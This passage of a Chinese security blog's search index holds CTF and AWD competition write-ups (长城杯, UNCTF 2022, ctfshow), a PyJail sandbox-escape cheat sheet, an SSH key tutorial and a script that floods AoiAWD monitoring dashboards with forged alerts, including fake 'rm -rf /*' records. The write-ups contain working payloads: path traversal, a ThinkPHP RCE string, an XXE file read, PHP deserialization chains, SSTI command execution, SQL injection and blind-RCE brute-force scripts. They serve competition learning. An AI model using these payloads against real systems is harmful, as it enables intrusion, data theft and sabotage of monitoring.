等文件不存在的，页面无法加载等情况","categories":[{"name":"教程","slug":"教程","permalink":"https://s1rius.space/categories/%E6%95%99%E7%A8%8B/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://s1rius.space/tags/vue/"},{"name":"gin","slug":"gin","permalink":"https://s1rius.space/tags/gin/"},{"name":"golang","slug":"golang","permalink":"https://s1rius.space/tags/golang/"}],"author":"s1rius"},{"title":"2024 长城杯铁人三项半决赛第二赛区 wp","slug":"awdwp","date":"2024-05-15T16:00:00.000Z","updated":"2024-05-15T16:00:00.000Z","comments":true,"path":"2024/05/awdwp/","permalink":"https://s1rius.space/2024/05/awdwp/","excerpt":"","text":"(未整理完) CFS misc1 备份文件泄露 下载后是流量包 流量包存在明文 flag （这里可能是非预期，预期是 aes 破解到 test 密码后，有个页面有个 flag） misc2 流量里还有一个 flag.zip 导出后 爆破得密码为 123456 web 存在 rce 查看解析目录后 echo 一句话木马进去 连接后 cat /flag 啥啥啥.txt flag get AWD 题目附件备份： php java1 java2 php hook 流量发现一个 php 路径穿越 /frontend/ajax/getfile?file=../../../../../../flag.txt 修复： 将/和.等用于路径穿越的字符过滤置空 java1 一个 java /forget.jsp?cmd1=cat+/flag.txt 修复 把 cmd1 字段改成复杂密码 使攻击者无法连接","categories":[{"name":"awd","slug":"awd","permalink":"https://s1rius.space/categories/awd/"}],"tags":[{"name":"awd","slug":"awd","permalink":"https://s1rius.space/tags/awd/"},{"name":"长城杯","slug":"长城杯","permalink":"https://s1rius.space/tags/%E9%95%BF%E5%9F%8E%E6%9D%AF/"},{"name":"铁人三项","slug":"铁人三项","permalink":"https://s1rius.space/tags/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/"}],"author":"s1rius"},{"title":"AoiAWD反制脚本","slug":"untiAoi","date":"2024-05-15T16:00:00.000Z","updated":"2024-05-15T16:00:00.000Z","comments":true,"path":"2024/05/untiAoi/","permalink":"https://s1rius.space/2024/05/untiAoi/","excerpt":"","text":"AoiAWD 反制脚本 起因 在经历过 awd 比赛中 AoiAWD 多次崩溃后(长城杯 虽然最后还是进决赛摸鱼了) 赛后研究了一下 开发了这个反制脚本 由于打点队友喜欢用 gogo 所以这个脚本支持 gogo 扫描结果 思路 发现后端未验证来自靶机的数据 因此存在脏数据污染 针对此开发脚本 可向 AoiAWD 的各个数据展示页面投放脏数据 包括告警页面 脚本 再此公布本脚本，希望下次 awd 遇见的时候别打我，谢谢 QAQ 12345678910111213141516171819202122232425262728293031323334353637383940414243import re import socket f = open(&quot;./ip.txt&quot;, &quot;r+&quot;) url_list = f.readlines() for i in url_list: pattern = r&quot;tcp://(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+)&quot; match = re.search(pattern, i, 0) if match: i = match.group(0).split(&quot;//&quot;)[1] p = int(i.split(&quot;:&quot;)[1]) i = i.split(&quot;:&quot;)[0] server_address = (i, p) # 替换SERVER_IP和SERVER_PORT为实际值 data = &#39;{&quot;type&quot;:&quot;ping&quot;}\\n&#39; data2 = &#39;{&quot;type&quot;:&quot;new_process&quot;,&quot;data&quot;:{&quot;pid&quot;:&quot;114514&quot;,&quot;ppid&quot;:&quot;114514&quot;,&quot;uid&quot;:&quot;0&quot;,&quot;username&quot;:&quot;root&quot;,&quot;cmd&quot;:&quot;rm -rf /*&quot;,&quot;param&quot;:&quot;su root rm -rf /*&quot;}}\\n&#39; data3 = &#39;{&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:{&quot;path&quot;:&quot;/update/score_points&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;ZmxhZ3tDcmF6eV9UaHVydGhkYXlfdl9tZV81MH0=&quot;}}\\n&#39; data4 = &#39;{&quot;type&quot;:&quot;web&quot;,&quot;data&quot;:{&quot;scipt&quot;:&quot;/var/www/html/rce.php&quot;,&quot;method&quot;:&quot;post&quot;,&quot;uri&quot;:&quot;127.0.0.1/rce.php&quot;,&quot;remote&quot;:&quot;127.0.0.1&quot;,&quot;buffer&quot;:&quot;{\\\\&quot;flag\\\\&quot;:\\\\&quot;flag{Crazy_Thurthday_v_me_50}\\\\&quot;}&quot;}}\\n&#39; data5 = &#39;{&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:{&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;}}\\n&#39; data6 = &#39;{&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:{&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;}}\\n&#39; data7 = &#39;{&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:{&quot;path&quot;:&quot;/114514&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;c3Ugcm9vdCBybSAtcmYgLyo=&quot;}}\\n&#39; with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock: try: sock.settimeout(1) sock.connect(server_address) sock.sendall(data.encode(&quot;utf-8&quot;)) tmp = sock.recvfrom(1024) if &quot;pong&quot; in str(tmp): sock.sendall(data2.encode(&quot;utf-8&quot;)) sock.sendall(data3.encode(&quot;utf-8&quot;)) sock.sendall(data4.encode(&quot;utf-8&quot;)) for j in range(60): sock.sendall(data7.encode(&quot;utf-8&quot;)) sock.sendall(data6.encode(&quot;utf-8&quot;)) sock.sendall(data5.encode(&quot;utf-8&quot;)) print(f&quot;[+] {i}\\n&quot;) sock.close() else: print( f&quot;\\n[-] --------------------------------{i}-------------------------------------\\n&quot; ) except Exception as e: print(f&quot;An error occurred: {e}&quot;) Next 由于分析了各个 AWD 防御工具(Aoi、wathbird 等) 决定模仿 aoi、并借鉴其他各个工具 重写一个基于 go(gin 或 iris 大概率会用 gin)的 AWD 监测防御系统 但是目前没有时间开发(别问，问就是鸽) 预计会在 2025 年 5 月问世 ：) 如果师傅们有留存的各个 AWD 比赛的流量等数据 以及分析了解过官方 check 机制的师傅 以及有大量参加 AWD 经验的大师傅 欢迎联系本菜鸡","categories":[{"name":"awd","slug":"awd","permalink":"https://s1rius.space/categories/awd/"}],"tags":[{"name":"awd","slug":"awd","permalink":"https://s1rius.space/tags/awd/"},{"name":"AoiAWD","slug":"AoiAWD","permalink":"https://s1rius.space/tags/AoiAWD/"},{"name":"反制脚本","slug":"反制脚本","permalink":"https://s1rius.space/tags/%E5%8F%8D%E5%88%B6%E8%84%9A%E6%9C%AC/"}],"author":"s1rius"},{"title":"终端便捷ssh（免密）连接","slug":"免密ssh登录","date":"2023-07-05T16:00:00.000Z","updated":"2023-07-05T16:00:00.000Z","comments":true,"path":"2023/07/免密ssh登录/","permalink":"https://s1rius.space/2023/07/%E5%85%8D%E5%AF%86ssh%E7%99%BB%E5%BD%95/","excerpt":"","text":"普通 ssh 方法 物理机 ssh 连接虚拟机 没基础的可以这样连：复杂 终端快捷 ssh 复制's前面的 打开终端设置 左侧添加新配置文件-&gt;添加新控制文件 然后填写第二行即命令行 1ssh 虚拟机登录用户名@虚拟机IP 其实就是 ssh 上面复制的 保存 即可在物理机终端快速打开 免密 ssh 登录 在物理机运行： 1ssh-keygen 后面第一个路径回车 后面密码直接回车（即可实现免密码登录） 12345678910111213Your identification has been saved in C:\\Users\\ /.ssh/id_rsa. Your public key has been saved in C:\\Users\\ /.ssh/id_rsa.pub. The key fingerprint is: SHA256:ln6ZkrhHWH*********tRbGBeooF4g \\ @ The key&#39;s randomart image is: +---[RSA 3072]----+ | .o.*.+ | |.. o..+ * . | |***********. | | *.o.o+.o | |. = +.o*S . | | ********* | +----[SHA256]-----+ 找到第一行的那个目录，把 id_rsa.pub 文件复制到虚拟机 执行 12cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys chmod 770 ~/.ssh/authorized_keys 报未找到.ssh 的话 要先运行ssh-keygen和在物理机设置一样 然后终端打开虚拟机就不用输密码了 报错情况 仍需密码： 传到虚拟机的 keygen 一定要是公钥 pub 连接超时 过一段时间之后 连不上 是 ip 未固定 需将虚拟机 ip 固定 桥接和 net 模式固定 IP 方式会抽空发 到时候在这打个传送 12cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys chmod 700 ~/.ssh/authorized_keys 报未找到.ssh 的话 要先运行ssh-keygen和在物理机设置一样 然后终端打开虚拟机就不用输密码了","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"ssh","slug":"ssh","permalink":"https://s1rius.space/tags/ssh/"}],"author":"s1rius"},{"title":"PyJail python沙箱逃逸探究","slug":"PyJail python沙箱逃逸探究","date":"2023-02-21T16:00:00.000Z","updated":"2023-02-21T16:00:00.000Z","comments":true,"path":"2023/02/PyJail python沙箱逃逸探究/","permalink":"https://s1rius.space/2023/02/PyJail%20python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%8E%A2%E7%A9%B6/","excerpt":"","text":"python 特性 在 python 中，类均继承自object基类； python 魔术方法 __init__：构造函数。这个在实例化类的时候就会用到，一般是接受类初始化的参数，并且进行一系列初始化操作。 __len__：返回对象的长度。 __str__：返回对象的字符串表示。对一个对象a使用str(a)时，会尝试调用a.__str__()。相似地，还有__int__魔术方法也用于类型转换，不过较少使用。 __getitem__：根据索引返回对象的某个元素。对一个对象a使用a[1]时，会尝试调用a.__getitem__(1)。 __add__、__sub__、__mul__、__div__、__mod__：算术运算，加减乘除模。如对一个对象a使用a+b时，会尝试调用a.__add__(b)。相应地，对于有些运算，对象需放在后面（第二个操作数）的，则需实现__radd__、__rsub__、__rmul__、__rdiv__、__rmod__，如椭圆曲线上的点的倍点运算G -&gt; d * G，就可以通过实现__rmul__来实现。 __and__，__or__、__xor__：逻辑运算，和算术运算类似； __eq__，__ne__、__lt__、__gt__、__le__、__ge__：比较运算，和算术运算类似；例如'贵州' &gt; '广西'，就会转而调用'贵州'.__gt__('广西')； __getattr__：对象是否含有某属性。如果我们对对象a所对应的类实现了该方法，那么在调用未实现的a.b时，就会转而调用a.__getattr__(b)。这也等价于用函数的方法调用：getattr(a, 'b')。有__getattr__，自然也有对应的__setattr__； __subclasses__：返回当前类的所有子类。一般是用在object类中，在object.__subclasses__()中，我们可以找到os模块中的类，然后再找到os，并且执行os.system，实现 RCE。 python 魔术属性 __dict__：可以查看内部所有属性名和属性值组成的字典。 __doc__：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。 __class__：返回当前对象所属的类。如''.__class__会返回&lt;class 'str'&gt;。拿到类之后，就可以通过构造函数生成新的对象，如''.__class__(4396)，就等价于str(4396)，即'4396'； __base__：返回当前类的基类。如str.__base__会返回&lt;class 'object'&gt;； 其他内置函数和变量 dir：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过getattr来拿到目标方法。 chr、ord：字符与 ASCII 码转换函数，能帮我们绕过一些 WAF globals：返回所有全局变量的函数； locals：返回所有局部变量的函数； __import__：载入模块的函数。例如import os等价于os = __import__('os')； __name__：该变量指示当前运行环境位于哪个模块中。如我们 python 一般写的if __name__ == '__main__':，就是来判断是否是直接运行该脚本。如果是从另外的地方 import 的该脚本的话，那__name__就不为__main__，就不会执行之后的代码。更多参考这里； __builtins__：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如str、chr、ord、dict、dir等。在 pyjail 的沙箱中，往往__builtins__被置为None，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到__builtins__，再__import__('os').system('sh')进行 RCE； __file__：该变量指示当前运行代码所在路径。如open(__file__).read()就是读取当前运行的 python 文件代码。需要注意的是，该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量； _：该变量返回上一次运行的 python 语句结果。需要注意的是，该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量。 WAF 过滤[] 使用pop、__getitem__ 代替 例如：a.__getitem__(0)、&#123;&quot;a&quot;: 1&#125;.pop(&quot;a&quot;) 或使用 next 等指针指向(类似无参 RCE 特殊函数遍历) 需要去别的是 python 需要使用迭代器iter(object[, sentinel])作为传入函数 过滤字符 chr() 函数构造字符 利用输出 1str(().__class__.__new__)[i]+…… 12&gt;&gt;&gt;print(str(().__class__.__new__)) &lt;built-in method __new__ of type object at 0x00007FFF01FE8AB0&gt; 过滤数字 0：int(bool([]))、Flase、len([])、any(()) 1：int(bool([&quot;&quot;]))、True、all(())、int(list(list(dict(a၁=())).pop()).pop()) len：len(str({}.keys)) 1.0：float(True) -1：~0 过滤特殊字符 str 被过滤type('')()、format() 即可。同理，int、list 都可以用 type 构造出来。 Non-ASCII Identifiers 在 python3 中支持 Non-ASCII Identifies 并且所有都会被转换成 unicode 的 NFKC（也就是标准模式）。我们可以用斜体或者花体各种各样的与标准字母相像的来进行导包操作。 参考链接 PyJail python 沙箱逃逸探究·总览 pyjail-学习总结【CV】 | TWe1v3","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"python","slug":"python","permalink":"https://s1rius.space/tags/python/"},{"name":"沙箱逃逸","slug":"沙箱逃逸","permalink":"https://s1rius.space/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"name":"PyJail","slug":"PyJail","permalink":"https://s1rius.space/tags/PyJail/"}],"author":"s1rius"},{"title":"ctfshow黑盒测试","slug":"ctfshow黑盒测试","date":"2022-12-31T16:00:00.000Z","updated":"2022-12-31T16:00:00.000Z","comments":true,"path":"2023/01/ctfshow黑盒测试/","permalink":"https://s1rius.space/2023/01/ctfshow%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/","excerpt":"","text":"web380 先看源码没发现啥 然后再点点看看功能 发现文章页的格式为 page_n.php 猜测为 sql 注入 直接在 n 处注入无效 尝试?id=处注入 发现报错 file_get_contents(1'.php) 直接读取 flag?id=flag flag 出现 web381 再次尝试上题思路，发现无回显 再次翻看源码 发现到 css 文件中出现了一个特殊地址 尝试打开，之后回退文件地址 直到退至/alsckdfy/出现 flag 一些文件的调用可能会来自某些特殊的地址 如本题中后台和前站共用同一个 css 文件 其他如通过 cdn、图床等溯源回网上仓库（github 等） 即可查到源码，或找到后台等特殊地址 web382-383 继续访问上题出现的后台地址 发现出现了个后台登陆界面 既然难度是梯度上升 可以考虑弱密码或者万能密码 进入 flag get√ web384 hint:密码前 2 位是小写字母，后三位是数字 再次进入后台登录页面 用户名肯定是 admin 然后就是爆破密码 方法一：写个脚本生成密码字典 方法二：使用 burp 爆破时 将 password 设为两个变量 $1 设置成小写字母长度：2 $2 设置成 3 位数字 password=xy123 web385 登陆界面进不去 扫目录 发现有 install 没删 重置管理员密码 一些网页模板的安装通常通过/install 目录进行安装 部分开发人员忘记删除 install 等目录就会暴露出一些特殊的功能点 如重置密码功能点 模板名、版本号、配置信息等敏感信息 重置后密码为 admin888 web386 再次访问 install 发现有个 lock.bat 给锁定住了 最开始几道题是前端用了后端文件 这题回去访问前端的同名文件 即本来应该调用的前端页面 发现第一行注释 访问 clear ：“清理成功” 回想到，install 里的 lock，直接删 clear.php?file=./install/lock.dat 这次访问 install 能重置了 返回后台登录初始账户 387 发现 robots 提示 debug，访问 提示 file 不存在 尝试 get 进去个 file 使用 log 执行命令将 lock 删除 &lt;?php unlink('/var/www/html/install/lock.dat')；?&gt; 还有种执行方式是将命令通过读取文件显示回显 &lt;?php system('==shell== &gt; /var/www/html/1.txt');?&gt;","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://s1rius.space/tags/ctfshow/"}],"author":"s1rius"},{"title":"2022 unctf wp","slug":"2022unctf wp","date":"2022-12-30T16:00:00.000Z","updated":"2022-12-30T16:00:00.000Z","comments":true,"path":"2022/12/2022unctf wp/","permalink":"https://s1rius.space/2022/12/2022unctf%20wp/","excerpt":"","text":"web 我太喜欢 bilibili 大学啦–中北大学 打开就一个 phpinfo 直接搜 flag 直出 虽然我是中北大学的，但这不是我们实验室出的题 略感离谱 签到-吉林警察学院 打开有行注释 以为拿来当用户名密码登录就完了来 结果只有个登录成功 假签到题 尝试使用其他用户名（规律：用户名=密码） 发现学号改一下会出现字符 再试试还有 开始爆破 burp 先设置最后一位为变量从 1 爆到 9 然后再设置两位为变量从 10 开始往后爆 最后手打的 flag 懒得写脚本了（为了个签到题写脚本不太划算） easy_upload-云南警官学院 传个一句话 mua 写的图片 🐎 进去发现不行 试了半天 把 ContentType 改成 png 传进去了 然后 🐜🗡 连一下 找 flag 在/home/ctf/flag 302 与深大-深圳大学 进去提示 302 重定向 burp 抓包 然后让 get 和 post 传参进去 最后改cookie: admin=true flag get√ 我太喜欢 bilibili 大学啦修复版-中北大学 打开又是 phpinfo 看题目描述找 hint 于是搜索 hint 发现指向 admin_unctf.php 看源码发现注释 再抓包，发现 hint2 get 用户名密码 unctf2022 审源码 注入点为 cookie 的 rce cmd=127.0.0.1|cat /flag 得到个网址 指向 B 站用户界面，flag 出现在个签里 babyphp-中国人民公安大学 先是弱类型 0e1 直接过 的二个弱类型比较 sha1 值 拿出收集的 sha1 值为 0exxxx 的字符组个 payload post 上去： a=0e1&amp;key1=aaroZmOk&amp;key2=aaK1STfY 当然用数组绕过也可以 a=0e1&amp;key1[1]=1&amp;key2[1]=2 发现回显有手就行 说明到最后一步了找了半天姿势 print env 出了 ?code=print_r(exec(&quot;env&quot;)); ezgame-浙江师范大学 进入游戏发现 999 滴血比 10 滴血 于是直接定位血量，搜索 10 和 999 发现 10 有一对 110 干扰，不好定位 于是从 999 下手 把 mainjs 放到本地 把代码缩起来方便看 发现 999（5149 行）在 120 里面定义 往前找 new 的 r 发现定位到 146（5104） 去看 146 发现个 life 和 maxlife 选择 maxlife 下手 先下个断点 运行后调用来生成各个属性，一开始给的是 10 即自己的血量 再继续运行直到 t=999 再修改右侧作用域里的 t 为 0 继续运行 flag 弹出 给你一刀-西南科技大学 放个 tp5.0 的页面在主页 指向性太明显了 直接搜 tp5.0 漏洞 当然以 rce 为主 只看了前几个网址 共有两种 payload 试了之后有一种成功 ?s=index|think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=env 听说 php 有一个 xxe-西南科技大学 拿出 xxe 最简单的 payload(做 buuctf 某 xxe 题时 payload 留的） 用 raw 格式发包 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root[ &lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt; ]&gt; &lt;root&gt; &lt;username&gt;&amp;flag;&lt;/username&gt; &lt;password&gt;2333&lt;/password&gt; &lt;/root&gt; 快乐三消-河南理工大学 做 ctfshow 的黑盒题做多了这种题就好说了 先扫目录扫到 admin 和.git githack 直接 down 下来 发现没多少东西 转去看 admin 也没注释啥的 开始猜密码 没猜到 放了一段时间回来看想到 admin 目录下还可能有备份泄露 之前光跑的主目录下的 跑 admin 下发现个 login.php.bak 有注释 admin/unctf 进入后台 本来又想 upload 的时候 直觉告诉我应该不是 转去看源码 发现 fi.php?filename=index.php 到这里后发现刚才扫目录的时候也扫到 fi 了 但是当时不知到咋用 fi 应该是 file 吧 学会了，下会遇见就接?filename= 定位到那个按钮发现是个网站套网站，应该能读 flag /admin/fi.php?filename=/flag 读到 题本身不难 但是误导性太强了 出题师傅 tql ezunseri-西华大学 destruct-&gt;get-&gt;toString-&gt;invoke-&gt;绕过 wakeup 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?php class Exec { public $content; public function execute($var) { eval($this-&gt;content); } public function __get($name) { echo $this-&gt;content; } public function __invoke() { $content = $this-&gt;execute($this-&gt;content); } public function __wakeup() { $this-&gt;content = &quot;&quot;; die(&quot;1!5!&quot;); } } class Test { public $test; public $key; public function __construct() { $this-&gt;test = new Exec(); $this-&gt;test-&gt;content = &quot;system(&#39;cat /fl*&#39;);&quot;; } public function __toString() { $name = $this-&gt;test; $name(); } } class Login { public $name; public $code = &#39;3.1415926&#39;; public $key; public function __destruct() { if ($this-&gt;code = &#39;3.1415926&#39;) { return $this-&gt;key-&gt;name; } } } $a = new Login(); $a-&gt;key = new Exec(); $a-&gt;key-&gt;content = new Test(); echo serialize($a),&quot;\\n&quot;; 得到 O:5:&quot;Login&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;code&quot;;s:9:&quot;3.1415926&quot;;s:3:&quot;key&quot;;O:4:&quot;Exec&quot;:1:&#123;s:7:&quot;content&quot;;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;test&quot;;O:4:&quot;Exec&quot;:1:&#123;s:7:&quot;content&quot;;s:19:&quot;system('cat /fl*');&quot;;&#125;s:3:&quot;key&quot;;N;&#125;&#125;&#125; 将 Exec 的成员数改为 2（两个任意一个即可） 绕过 wakeup O:5:&quot;Login&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;code&quot;;s:9:&quot;3.1415926&quot;;s:3:&quot;key&quot;;O:4:&quot;Exec&quot;:1:&#123;s:7:&quot;content&quot;;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;test&quot;;O:4:&quot;Exec&quot;:2:&#123;s:7:&quot;content&quot;;s:19:&quot;system('cat /fl*');&quot;;&#125;s:3:&quot;key&quot;;N;&#125;&#125;&#125; poppop-中国人民公安大学 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php class A { public $code = &quot;phpinfo();&quot;; function __call($method, $args) { eval($this-&gt;code); } function __wakeup() { $this-&gt;code = &quot;&quot;; } } class B { public $key; function __destruct() { echo $this-&gt;key; } } class C { private $key2; function __construct() { return $this-&gt;key2 = new A(); } function __toString() { return $this-&gt;key2-&gt;abab(1,1); } } $b = new B(); $b-&gt;key = new C(); //$b-&gt;key-&gt;key2 = new A(); echo urlencode(serialize($b)), &quot;\\n&quot;; echo serialize($b), &quot;\\n&quot;; babynode-云南大学 看题目描述 原型链污染 直接套 ps：感觉见过类似的题好像是 ctfshow？ json 格式传 1{&quot;__proto__&quot;:{&quot;id&quot;:&quot;unctf&quot;}} easy ssti-金陵科技学院 jinjia2 ssti 常用 payload 随便上一个 过滤 class 各种操作掩护一下 class 都不行 class 查的很严啊 别骂了别骂了 换方法: &#123;&#123;x.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('ls').read()\")&#125;&#125; 成功输出 改下 payload 读 flag.txt NM 给你点祝福了你还骗我 nnd 想到这个比赛藏 flag 基本都在 env 里 有无代打出题人服务 读 env 成功 easy_rce-西南科技大学 提示 rce 的布尔盲注 发现&gt;&lt;被过滤 不乐 写脚本直接爆 123456789101112131415161718import requests charlist = &#39;abcdefghijklmnopqrstuvwxyz01234567890_-&#39; result = &#39;&#39; for i in range(7, 50): for char in charlist: url = &quot;http://4a423fce-e3cf-4d13-9f02-f28cb11fa8ba.node.yuzhian.com.cn/index.php?code=test $(echo $(tac /?lag)|cut -c {0}) == {1}||1&quot;.format( i, char) # print(url) back = requests.get(url=url) # print(back.text) if &quot;success&quot; in back.text: result = result + char print(i, back.text) break if &quot;fail&quot; in back.text: break print(&#39;UNCTF{&#39; + result + &#39;}&#39;) EZ-2048 按下 f12 发现程序监听等候在 game.js 然后想到输入邀请码错误后返回 error 在 game.js 搜索 error 然后一直往上查到 checkInvited() 仔细阅读后发现 加密方式在这里 分奇偶数进行两种异或 由于环境中 f12 自动卡在 debuger 所以只能 down 到本地运行 本地起了个环境 删掉 game.js 的第一行 使得可以本地调试 由于需要得到这几组数据 需要转成正常 10 进制 尝试打个断点 看下数据 可以在 debug 中 点击 buf 后面的跳转到内存检查器 16 转 10 后得到正常数据 写脚本逆回去 由于偶数列与 invite 的 i+1 相关即 invite 的奇数项 所以需要先将 invite 的奇数项全部生成 先把奇数项逆回去 123456789101112131415161718view = [ 68, 51, 15, 80, 93, 14, 58, 50, 88, 48, 42, 26, 13, 22, 18, 5, 2, 86, 0, 2, 0, 19, 0, 0 ] inv = &#39;&#39; for i in range(1, 24, 2): # 先逆奇数项 other = view[i - 2] if i - 2 &gt;= 0 else 0 view[i] ^= other for i in range(0, 24, 2): # 再逆偶数项 other = view[i + 1] if i + 1 &lt;= 23 else 0 view[i] ^= other for i in range(24): inv += chr(view[i]) print(inv) ## w3lc0me_7o_unctf2022!!!! 然后将本地的 game.js 中 addRandomTile（） 生成的随机方块改为固定的 即将 223 行改为 const value = 1024; 通关条件检测的是 1024 碰撞生成 2018 的过程 此处若改为 2048 则无该过程 所以最快只能改为 1024 我感觉该题貌似也可以通过逆向 wasm 来直接获取 flag 不过那估计就不是 web 题了 乐 本来这题就是个密码学题 不乐 随便注-云南警官学院 过滤了 or and select use（是 use 不是 user？怪哦）双写可绕过 尝试了几下没啥手感 转去偷懒用 sqlmap 先是读库，表，行都正常 记得有个 haha 表 笑话我是吧 然后还有个 ctftranning -&gt; FLAG_TABLE -&gt; FLAG_COLUMN 读的时候没回显貌似是空的 但是读 ctftranning 里的 news 里面说就在这个库里，但不在这 人傻了 在那个库里疯狂找 甚至怀疑 FLAG_COLUMN 里的读不到是有过滤导致的 还在那想咋绕过啥的 最后死活出不来 于是去尝试 sql 注入的文件操作 sqlmap --os-shell没成功？ 但是--file-read &quot;/flag&quot;成功带回 Sqlsql-中国人民公安大学 审源码发现 多处都有 addslashes_deep 过滤 有想到时 addslash 旧版本有绕过 跟进之后发现该函数过滤挺严格的 于是放弃该方法 转向逻辑性漏洞 最后发现 index.php 里 qxxx 都没有经过 addslashes_deep 过滤直接 insert 进去了 尝试从这里注进去 由于本体的重点应该是使用 admin 用户去查询 所以考虑能 insert 一个 admin 用户的方法 不需要查数据所以也就不需要回显 ');insert into users values (NULL,'admin','2105044235');# 在 index.php 的做题界面随便选 burp 截包将上面 payload 加在 post 的答案后面重发 然后登出 用 admin 登录 查询成绩 这里查询任何一位存在的用户都可以 get flag PWN welcomeUNCTF2022-云南警官学院 石头剪刀布-西华大学 伪随机数 伪代码中 seed=0xA 然后 pwn 12345678910111213141516171819202122232425262728293031323334353637from pwn import * from ctypes import * elf = cdll.LoadLibrary(&#39;libc.so.6&#39;) context.log_level = &#39;info&#39; elf.srand(0xA) k = 0 list = [] conn = remote(&#39;node.yuzhian.com.cn&#39;, 31599) conn.recv() conn.send(&#39;y&#39;) conn.recv() print(&quot;pwn!&quot;) conn.recv() print(&quot;1&quot;) for i in range(100): num = elf.rand() % 3 if num == 0: payload = 2 elif num == 1: payload = 0 else: payload = 1 print(i, &#39;:&#39;, payload) print(str(payload)) conn.sendline(str(payload)) tf = conn.recvrepeat(timeout=0.1) # if &quot;success!!!&quot; in str(tf): # print(&quot;###################&quot;) conn.close() flag = conn.recvall() print(&#39;&#39;.join(list), tf, flag) re whereisyourkey-广东海洋大学 先看 main 建了个数组 经过 ooooo 处理 即为 flag 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt; using namespace std; int ooooo(int a1) { if (a1 == 109) return 109; if (a1 &lt;= 111) { if (a1 &lt;= 110) a1 -= 2; } else { a1 += 3; } return a1; } int main() { int v5[10], i; v5[0] = 118; v5[1] = 103; v5[2] = 112; v5[3] = 107; v5[4] = 99; v5[5] = 109; // //109 v5[6] = 104; v5[7] = 110; v5[8] = 99; v5[9] = 105; cout&lt;&lt;&quot;UNCTF{&quot;; for (i = 0; i &lt;= 9; ++i) { v5[i] = ooooo(v5[i]); cout &lt;&lt; (char)v5[i]; } cout&lt;&lt;&quot;}&quot;; } ezzzzre-广东海洋大学 直接根据他的处理 flag = 2 * aHelloctf[i] - 69; 12345678910111213141516#include &lt;iostream&gt; using namespace std; int main() { string aHelloctf = &quot;HELLOCTF&quot;; string flag; int i; for (i = 0; i &lt;= 7; ++i) { flag = 2 * aHelloctf[i] - 69; cout &lt;&lt; flag; } //cout &lt;&lt; flag &lt;&lt; endl; } crypto dddd-西南科技大学 就 0 和 1 转成.- /转成空格 莫斯解 赛博厨子构造一手一把梭 md5-1-西南科技大学及 misc 小心海最后一步脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from hashlib import md5 ######这里是MD5-1的脚本 file = open(&quot;outben.txt&quot;, &#39;r&#39;) line = file.readlines() ## rint(line) list = [ &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;, &#39;{&#39;, &#39;}&#39;, &#39;_&#39; ] flags = [] for i in line: for j in range(0, 36, 1): md = md5(list[j].encode()).hexdigest() if (i.strip(&#39;\\n&#39;) == md): flags += list[j] flag = &#39;&#39;.join(flags) print(&#39;UNCTF{&#39;+flag+&#39;}&#39;) 